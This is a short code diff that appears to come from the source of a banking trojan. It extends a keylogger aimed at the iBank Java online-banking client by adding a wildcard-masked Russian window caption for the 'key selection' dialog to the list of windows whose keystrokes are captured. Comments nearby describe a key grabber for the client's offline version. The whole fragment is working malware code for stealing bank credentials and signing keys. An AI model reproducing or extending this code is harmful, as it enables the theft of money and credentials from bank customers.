@@ -660,7 +660,8 @@ void RegisterIBankSystem(DWORD hashApp)
 	char ClassName[] = {'S','u','n','A','w','t','F','r','a','m','e', 0};;
 	char Caption1[]  = {'*', 'в', 'х', 'о', 'д', '*',  0};;
 	char Caption2[]  = {'*', 'в', 'х', '*', 'д', '*',  0};
-	char Caption3[]  = {'*','и','н','х','р','о','н','*','з','а','ц','*','я','*', 0}; //Синхронизация с банком
+	char Caption3[]  = {'*','и','н','х','р','о','н','*','з','а','ц','*', 0}; //Синхронизация с банком
+	char Caption4[]	 = {'*','в','*','б','*','р','*','к','л','ю','ч','а', 0}; //выбор ключа
 
 
 	DWORD hashMain = PROCESS_HASH_JAVA;
@@ -709,6 +710,7 @@ void RegisterIBankSystem(DWORD hashApp)
 			F->DontSaveMouseLog = true;
 			KeyLogger::AddFilterText(F, NULL, Caption2);
 			KeyLogger::AddFilterText(F, NULL, Caption3);
+			KeyLogger::AddFilterText(F, NULL, Caption4);
 		}
 
 		if( hashMain == PROCESS_HASH_JAVAW ) //граббер ключей для оффлайн версии
